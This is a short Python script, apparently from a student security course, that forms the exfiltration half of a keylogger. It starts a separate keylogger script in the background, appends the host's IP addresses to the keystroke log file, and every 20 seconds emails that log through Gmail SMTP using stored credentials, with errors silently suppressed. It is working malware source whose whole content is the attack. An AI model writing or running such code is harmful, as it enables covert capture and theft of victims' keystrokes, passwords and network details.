import requests
import time
import os
from pynput.keyboard import Listener
import smtplib
from email.message import EmailMessage
import config
startlog = time.time()

os.system("(python3 '/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scripts/Security Scripts/KeyloggerRemote.py' &) ; (ifconfig | grep -w 'inet' >> keyboard_input.txt &)")
time.sleep(1)

def send_request():
    
    with open('keyboard_input.txt') as msgcontent:
        msg = EmailMessage()
        msg.set_content(msgcontent.read())
    try:
        msg['Subject'] = f'The contents of {"keyboard_input.txt"}'
        msg['From'] = 'fantasticmrfood@gmail.com'
        msg['To'] = 'fantasticmrfood@gmail.com'
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(config.EMAIL_ADDRESS, config.PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

def interval():
    global startlog
    if time.time() - 20 > startlog:
        #print('its been 20 secs')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    #print(counter)
    interval()
    time.sleep(1)